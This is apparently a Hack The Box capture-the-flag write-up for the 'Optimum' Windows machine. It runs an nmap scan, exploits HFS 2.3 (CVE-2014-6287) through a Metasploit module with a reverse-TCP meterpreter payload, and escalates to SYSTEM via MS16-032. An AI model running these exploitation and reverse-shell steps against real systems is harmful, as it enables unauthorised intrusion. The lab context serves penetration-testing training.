# Hack The Box — Optimum Writeup

##  Machine Info
- **Machine Name**: Optimum
- **IP Address**: 10.129.78.248
- **Operating System**: Windows
- **Date Completed**: 2025-07-01
- **Tools Used**: nmap,searchsploit, exploit-db, msfconsole, systeminfo

---

## 1. Reconnaissance

Initial Nmap scan:
```bash
nmap -sV -O -T4 10.129.78.248
````

### 🔎 Nmap Results

| Port | Service | Version                  |
| ---- | ------- | ------------------------ |
| 80   | HTTP    | HttpFileServer httpd 2.3 |

---

## 2. Enumeration

Accessed the target in the browser:

```
http://10.129.78.248/
```

Confirmed version: **HttpFileServer 2.3 (HFS 2.3)**

## 3. Exploitation

Identified a known RCE in HFS 2.3:

```bash
searchsploit hfs 2.3
```

Result:

```
Rejetto HttpFileServer (HFS) 2.3 - Remote Command Execution (CVE-2014-6287)
```

### Exploitation via Metasploit:

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.129.78.248
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.77
run
```

Got a **Meterpreter shell as user**.

---

## 4. Privilege Escalation

Checked user:

```bash
whoami
```

Gathered system info:

```bash
systeminfo
```

Exploited a known local vulnerability (e.g., MS16-032):

```bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 2
set LHOST 10.10.14.77
run
```

 Successfully escalated to **NT AUTHORITY\SYSTEM**.

---

##  5. Flags Captured

```cmd
type C:\Users\kostas\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```
